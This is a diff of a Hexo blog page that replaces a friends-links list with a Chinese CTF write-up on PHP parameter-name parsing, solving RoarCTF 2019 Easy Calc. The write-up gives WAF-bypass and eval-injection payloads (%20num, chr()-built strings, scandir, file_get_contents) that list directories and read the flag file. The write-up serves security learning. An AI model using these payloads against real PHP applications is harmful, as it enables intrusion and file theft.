@@ -13,20 +13,28 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/links/"/>
+    <link rel="canonical" href="http://example.com/2024/10/13/php参数名解析特性/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta property="og:type" content="website">
-<meta property="og:title" content="links">
-<meta property="og:url" content="http://example.com/links/index.html">
+        <meta name="description" content="PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1）删除空白符2）将某些字符转换为下划线（包括空格） 来看一张图 当PHP版本小于8时，如果参数中出现多次中括号[，只有第一个中括号会被转换成下划线_，其他的不变 当PHP版本等于8时，传入的参数名中非法字符一律全部转换为了下划线 来看看例题，[RoarCTF 2019]Easy Calc 访问&#x2F;calc.php，得到源">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php参数名解析特性">
+<meta property="og:url" content="http://example.com/2024/10/13/php%E5%8F%82%E6%95%B0%E5%90%8D%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1）删除空白符2）将某些字符转换为下划线（包括空格） 来看一张图 当PHP版本小于8时，如果参数中出现多次中括号[，只有第一个中括号会被转换成下划线_，其他的不变 当PHP版本等于8时，传入的参数名中非法字符一律全部转换为了下划线 来看看例题，[RoarCTF 2019]Easy Calc 访问&#x2F;calc.php，得到源">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-07-19T02:39:15.000Z">
-<meta property="article:modified_time" content="2024-07-19T02:39:15.953Z">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-824efa32e71f6453e246ca558e42ce43_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-433c0b5d63a05f1e51c7fe2adecf6339_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-eec56d7cd79d41449075ca37d36165dc_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9e0b222fedc7bbe4c12d6a0219194aa7_1440w.webp">
+<meta property="article:published_time" content="2024-10-13T03:04:27.361Z">
+<meta property="article:modified_time" content="2024-10-13T03:07:04.869Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp">
     
     
     <!--- Icon Part-->
@@ -38,7 +46,7 @@
     
     <title>
         
-            Links -
+            php参数名解析特性 -
         
         Saofe1a
     </title>
@@ -345,7 +353,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/links/"
                                         >
                                     <i class="fa-regular fa-link fa-fw"></i>
@@ -439,7 +447,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/links/"
                         >
                             <span>
@@ -489,111 +497,235 @@
             <div class="main-content">
 
                 
-                    <div class="page-template-container">
-    
-    
-    
-        <div class="friends-link-container flex flex-col">
-    <h1 class="text-[3.2rem] mt-1.5 mb-5 font-bold leading-[1]">links</h1>
-    
-        <div class="mt-2 mb-4">
-            <h2 class="text-2xl font-bold">CTF Intimate</h2>
-        </div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">php参数名解析特性</h1>
+                </div>
+            
+            </div>
+
         
-        <ul class="grid mb-6 gap-4 grid-cols-2">
-            
-                <li class="group transform scale-100 transition-transform duration-100 ease-linear active:scale-95">
-                    <a target="_blank" rel="noopener" href="https://qanux.github.io">
-                        <div class="flex flex-row items-center gap-1 sm:gap-2 overflow-hidden min-w-0 rounded-lg redefine-box-shadow-flat">
-                            <div class="h-16 w-16 rounded-bl-lg bg-third-background-color">
-                                
-                                    <img class="rounded-l-lg h-16 w-16 max-w-none"
-                                         src="https://qanux.github.io/img/friend_404.gif"
-                                         onerror="this.style.display='none'"
-                                    >
-                                
-                            </div>
-                            <div class="flex flex-col min-w-0">
-                                <div class="text-lg text-second-text-color ellipsis group-hover:!text-primary">Qanux</div>
-                                <div class="text-third-text-color ellipsis">时严肃时逗比的pwn佬</div>
-                            </div>
-                        </div>
-                    </a>
-                </li>
-            
-                <li class="group transform scale-100 transition-transform duration-100 ease-linear active:scale-95">
-                    <a target="_blank" rel="noopener" href="https://ngsjcbf.github.io">
-                        <div class="flex flex-row items-center gap-1 sm:gap-2 overflow-hidden min-w-0 rounded-lg redefine-box-shadow-flat">
-                            <div class="h-16 w-16 rounded-bl-lg bg-third-background-color">
-                                
-                                    <img class="rounded-l-lg h-16 w-16 max-w-none"
-                                         src="https://pic1.zhimg.com/80/v2-a019ca1ef844a23263bf46451ed812dc_1440w.webp"
-                                         onerror="this.style.display='none'"
-                                    >
-                                
-                            </div>
-                            <div class="flex flex-col min-w-0">
-                                <div class="text-lg text-second-text-color ellipsis group-hover:!text-primary">Ng</div>
-                                <div class="text-third-text-color ellipsis">亲亲亲亲亲爱的东哥！</div>
-                            </div>
-                        </div>
-                    </a>
-                </li>
-            
-                <li class="group transform scale-100 transition-transform duration-100 ease-linear active:scale-95">
-                    <a target="_blank" rel="noopener" href="https://hvang10.github.io">
-                        <div class="flex flex-row items-center gap-1 sm:gap-2 overflow-hidden min-w-0 rounded-lg redefine-box-shadow-flat">
-                            <div class="h-16 w-16 rounded-bl-lg bg-third-background-color">
-                                
-                                    <img class="rounded-l-lg h-16 w-16 max-w-none"
-                                         src="https://pic3.zhimg.com/80/v2-77e3d34e0b36205b39e9d272a41f01ea_1440w.webp"
-                                         onerror="this.style.display='none'"
-                                    >
-                                
-                            </div>
-                            <div class="flex flex-col min-w-0">
-                                <div class="text-lg text-second-text-color ellipsis group-hover:!text-primary">Hvang</div>
-                                <div class="text-third-text-color ellipsis">中流砥柱，伟大无需多言</div>
-                            </div>
-                        </div>
-                    </a>
-                </li>
-            
-                <li class="group transform scale-100 transition-transform duration-100 ease-linear active:scale-95">
-                    <a target="_blank" rel="noopener" href="https://Chimedal.github.io">
-                        <div class="flex flex-row items-center gap-1 sm:gap-2 overflow-hidden min-w-0 rounded-lg redefine-box-shadow-flat">
-                            <div class="h-16 w-16 rounded-bl-lg bg-third-background-color">
-                                
-                                    <img class="rounded-l-lg h-16 w-16 max-w-none"
-                                         src="https://pic3.zhimg.com/80/v2-5e7ce789b71fe0e89ed4757a3bdf8f2e_1440w.webp"
-                                         onerror="this.style.display='none'"
-                                    >
-                                
-                            </div>
-                            <div class="flex flex-col min-w-0">
-                                <div class="text-lg text-second-text-color ellipsis group-hover:!text-primary">Chimedal</div>
-                                <div class="text-third-text-color ellipsis">我的希望我的光</div>
-                            </div>
-                        </div>
-                    </a>
-                </li>
-            
-        </ul>
-        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Saofe1a</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-13 11:04:27</span>
+        <span class="mobile">2024-10-13 11:04:27</span>
+        <span class="hover-info">Created</span>
+    </span>
     
-    <div class="clear"></div>
-</div>
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-13 11:07:04</span>
+            <span class="mobile">2024-10-13 11:07:04</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
 
     
-    <div class="page-template-content markdown-body">
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>418 Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1）删除空白符<br>2）将某些字符转换为下划线（包括空格）</p>
+<p>来看一张图<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp"
+                     
+                ></p>
+<p>当<code>PHP版本小于8</code>时，如果参数中出现多次中括号<code>[</code>，只有第一个中括号会被转换成下划线<code>_</code>，其他的不变</p>
+<p>当<code>PHP版本等于8</code>时，传入的参数名中非法字符一律全部转换为了下划线</p>
+<p>来看看例题，<code>[RoarCTF 2019]Easy Calc</code></p>
+<p>访问<code>/calc.php</code>，得到源码<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-824efa32e71f6453e246ca558e42ce43_1440w.webp"
+                     
+                ><br>当num传递的为字母时，被waf拦截（另一个waf，不是上面PHP文件设置的黑名单）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic4.zhimg.com/80/v2-433c0b5d63a05f1e51c7fe2adecf6339_1440w.webp"
+                     
+                ><br>这里就可以用到字符串解析特性了，对于这种get参数非常好用，在<code>num</code>前面加上<code>空格</code>或者<code>+号</code>，再测试一下就可以了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-eec56d7cd79d41449075ca37d36165dc_1440w.webp"
+                     
+                ></p>
+<p>由于对<code>&#39;</code>单引号过滤，可以使用<code>chr()</code>函数绕过<br>这里尝试使用 <code>system(&#39;ls&#39;)</code> 获取目录时失败<br>用print_r(scandir(‘&#x2F;‘))<br><code>calc.php?%20num=print_r(scandir(chr(47)))</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-9e0b222fedc7bbe4c12d6a0219194aa7_1440w.webp"
+                     
+                ></p>
+<p>payload:<code>calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
+<p>查看目录的PHP语句如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;); </span><br><span class="line">echo system(&#x27;ls&#x27;); </span><br><span class="line">eval(system(&#x27;ls&#x27;)); </span><br><span class="line">eval(&quot;echo system(&#x27;ls&#x27;);&quot;); </span><br><span class="line"> </span><br><span class="line">print_r(scandir(&#x27;.&#x27;)); </span><br><span class="line">echo print_r(scandir(&#x27;.&#x27;)); </span><br><span class="line">eval(print_r(scandir(&#x27;.&#x27;))); </span><br><span class="line">eval(&quot;print_r(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line">eval(&quot;echo print_r(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line"> </span><br><span class="line">var_dump(scandir(&#x27;.&#x27;)); </span><br><span class="line">echo var_dump(scandir(&#x27;.&#x27;)); </span><br><span class="line">eval(var_dump(scandir(&#x27;.&#x27;))); </span><br><span class="line">eval(&quot;var_dump(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line">eval(&quot;echo var_dump(scandir(&#x27;.&#x27;));&quot;); </span><br></pre></td></tr></table></figure></div>
+
+<p>读取文件内容的PHP语句将上面的函数改为<code>file_get_contents()</code></p>
+<p>当对引号进行过滤时，可以使用<code>chr()</code>拼接的方式进行过滤</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> php参数名解析特性</li>
+        <li><strong>Author:</strong> Saofe1a</li>
+        <li><strong>Created at
+                :</strong> 2024-10-13 11:04:27</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-10-13 11:07:04
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://saofeia.github.io/2024/10/13/php参数名解析特性/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Thinkphp5.1 反序列化ajax链</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
         
             
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
         
     </div>
-    <div class="page-template-comments">
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">php参数名解析特性</div>
         
+
     </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -680,6 +812,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
